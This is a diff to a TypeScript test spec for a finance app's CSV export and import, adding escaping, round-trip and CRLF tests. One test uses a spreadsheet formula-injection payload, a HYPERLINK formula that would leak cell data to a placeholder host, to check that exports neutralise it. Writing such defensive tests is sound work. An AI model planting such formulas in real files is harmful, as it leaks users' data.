@@ -8,6 +8,7 @@ import { AuthService } from './auth.service';
 import { MockFirestoreService } from './testing/mock-firestore.service';
 import { MockAuthService } from './testing/mock-auth.service';
 import { createTransaction, createCategory, createCategoryHierarchy } from './testing/test-data';
+import { parseCsvRows } from '../utils/csv.utils';
 import { Timestamp } from '@angular/fire/firestore';
 
 class MockTranslationService {
@@ -61,20 +62,15 @@ describe('ExportService', () => {
   });
 
   describe('exportToCSV', () => {
-    it('should include headers in CSV', () => {
-      const transactions = [createTransaction()];
-      const blob = service.exportToCSV(transactions);
+    it('names every detailed column in the header', async () => {
+      const blob = service.exportToCSV([createTransaction()]);
 
-      const reader = new FileReader();
-      reader.onload = () => {
-        const content = reader.result as string;
-        expect(content).toContain('Date');
-        expect(content).toContain('Type');
-        expect(content).toContain('Category');
-        expect(content).toContain('Description');
-        expect(content).toContain('Amount');
-      };
-      reader.readAsText(blob);
+      const headerLine = (await blob.text()).split('\n')[0];
+
+      expect(headerLine.split(',')).toEqual([
+        'Date', 'Type', 'Category', 'Description', 'Amount', 'Currency',
+        'Amount (Base)', 'Note', 'Tags', 'Location'
+      ]);
     });
 
     it('should include transaction data', (done) => {
@@ -150,19 +146,7 @@ describe('ExportService', () => {
       expect(result[0].date.getDate()).toBe(1);
     });
 
-    it('ends the detailed header with Tags and Location', (done) => {
-      const blob = service.exportToCSV([createTransaction()]);
-
-      const reader = new FileReader();
-      reader.onload = () => {
-        const headerLine = (reader.result as string).split('\n')[0];
-        expect(headerLine.endsWith('Note,Tags,Location')).toBeTrue();
-        done();
-      };
-      reader.readAsText(blob);
-    });
-
-    it('emits the location name, escaped, and an empty cell without one', (done) => {
+    it('emits the location name in its own cell and an empty one without it', async () => {
       // Distinct pinned dates: the export sorts rows date-descending, and two
       // now() fixtures only keep their insertion order when both land in the
       // same millisecond — a coin-flip that made this spec flaky.
@@ -179,16 +163,15 @@ describe('ExportService', () => {
       ];
       const blob = service.exportToCSV(transactions);
 
-      const reader = new FileReader();
-      reader.onload = () => {
-        const lines = (reader.result as string).split('\n');
-        // Name only — the coordinates stay out of the CSV.
-        expect(lines[1].endsWith(',"Aoyama, Market"')).toBeTrue();
-        expect(lines[1]).not.toContain('35.66');
-        expect(lines[2].endsWith(',')).toBeTrue();
-        done();
-      };
-      reader.readAsText(blob);
+      // Asserted on the cell, not the end of the line: pinning the tail is
+      // what made this break when Period and Recurring were appended.
+      const rows = parseCsvRows(await blob.text());
+      const locationCol = rows[0].indexOf('Location');
+
+      // Name only — the coordinates stay out of the CSV.
+      expect(rows[1][locationCol]).toBe('Aoyama, Market');
+      expect(rows[1].join(',')).not.toContain('35.66');
+      expect(rows[2][locationCol]).toBe('');
     });
 
     it('should apply date range filter', () => {
@@ -212,20 +195,15 @@ describe('ExportService', () => {
       expect(blob.size).toBeGreaterThan(0);
     });
 
-    it('should use summary format when specified', (done) => {
-      const transaction = createTransaction();
-      const blob = service.exportToCSV([transaction], { format: 'summary' });
+    it('keeps the summary format at five columns', async () => {
+      const blob = service.exportToCSV([createTransaction()], { format: 'summary' });
 
-      const reader = new FileReader();
-      reader.onload = () => {
-        const content = reader.result as string;
-        // Summary format should have fewer columns
-        const headerLine = content.split('\n')[0];
-        const columns = headerLine.split(',');
-        expect(columns.length).toBe(5); // Date, Type, Category, Amount, Currency
-        done();
-      };
-      reader.readAsText(blob);
+      const headerLine = (await blob.text()).split('\n')[0];
+
+      // Summary is the at-a-glance format and is lossy on purpose: it already
+      // drops description, note, tags and location, so carrying Period would
+      // not make it round-trip — it would only cost it its shape.
+      expect(headerLine.split(',').length).toBe(5); // Date, Type, Category, Amount, Currency
     });
 
     it('should translate category names using translation keys', (done) => {
@@ -292,6 +270,66 @@ describe('ExportService', () => {
       };
       reader.readAsText(blob);
     });
+
+    it('escapes a comma in a category name', async () => {
+      categoryService.categories.set([createCategory({
+        id: 'food_test',
+        name: 'Food, Drinks & More',
+        type: 'expense'
+      })]);
+      const blob = service.exportToCSV([createTransaction({ categoryId: 'food_test' })]);
+
+      const rows = parseCsvRows(await blob.text());
+
+      // The row keeps its column count: an unescaped comma here shifted every
+      // later cell, and Location fell off the end.
+      expect(rows[1].length).toBe(rows[0].length);
+      expect(rows[1][rows[0].indexOf('Category')]).toBe('Food, Drinks & More');
+    });
+
+    it('escapes a comma in a tag', async () => {
+      const blob = service.exportToCSV([createTransaction({
+        tags: ['groceries, bulk', 'reimbursable']
+      })]);
+
+      const rows = parseCsvRows(await blob.text());
+
+      expect(rows[1].length).toBe(rows[0].length);
+      expect(rows[1][rows[0].indexOf('Tags')]).toBe('groceries, bulk; reimbursable');
+    });
+
+    it('keeps a note containing a newline in a single row', async () => {
+      const blob = service.exportToCSV([createTransaction({
+        note: 'first line\nsecond line'
+      })]);
+
+      const rows = parseCsvRows(await blob.text());
+
+      expect(rows.length).toBe(2);
+      expect(rows[1][rows[0].indexOf('Note')]).toBe('first line\nsecond line');
+    });
+
+    it('guards a description the receipt scanner wrote as a formula', async () => {
+      const blob = service.exportToCSV([createTransaction({
+        description: '=HYPERLINK("http://x/?d="&A1,"receipt")'
+      })]);
+
+      const content = await blob.text();
+
+      // A spreadsheet opening this must see text, not a live formula.
+      expect(content).toContain('\'=HYPERLINK');
+      expect(content).not.toContain(',=HYPERLINK');
+    });
+
+    it('leaves the amount columns numeric so a spreadsheet still sums them', async () => {
+      const blob = service.exportToCSV([createTransaction({ amount: 45, amountInBaseCurrency: 45 })]);
+
+      const rows = parseCsvRows(await blob.text());
+
+      expect(rows[1][rows[0].indexOf('Amount')]).toBe('45');
+      expect(rows[1][rows[0].indexOf('Amount (Base)')]).toBe('45');
+    });
+
   });
 
   describe('exportToJSON', () => {
@@ -556,6 +594,42 @@ describe('ExportService', () => {
       expect(result[0].currency).toBeUndefined();
       expect(service.parseImportedData(result, 'THB')[0].currency).toBe('THB');
     });
+  });
+
+  describe('CSV round trip', () => {
+    function csvFile(text: string): File {
+      return new File([text], 'transactions.csv', { type: 'text/csv' });
+    }
+
+    async function reimport(transactions: Parameters<ExportService['exportToCSV']>[0]) {
+      const blob = service.exportToCSV(transactions);
+      return service.importFromCSV(csvFile(await blob.text()));
+    }
+
+    it('round-trips a description holding a comma, a quote, a newline and a leading equals', async () => {
+      const description = '=SUM(A1,A2) "net", after\ndiscount';
+
+      const result = await reimport([createTransaction({ description })]);
+
+      expect(result.length).toBe(1);
+      expect(result[0].description).toBe(description);
+    });
+
+    it('round-trips a description that begins with an apostrophe', async () => {
+      const result = await reimport([createTransaction({ description: "'til payday" })]);
+
+      expect(result[0].description).toBe("'til payday");
+    });
+
+    it('reads a file whose rows end with CRLF', async () => {
+      const text = 'Date,Description,Amount\r\n2026-06-01,Coffee,4.50\r\n';
+
+      const result = await service.importFromCSV(csvFile(text));
+
+      expect(result.length).toBe(1);
+      expect(result[0].description).toBe('Coffee');
+    });
+
   });
 
   describe('downloadBlob', () => {
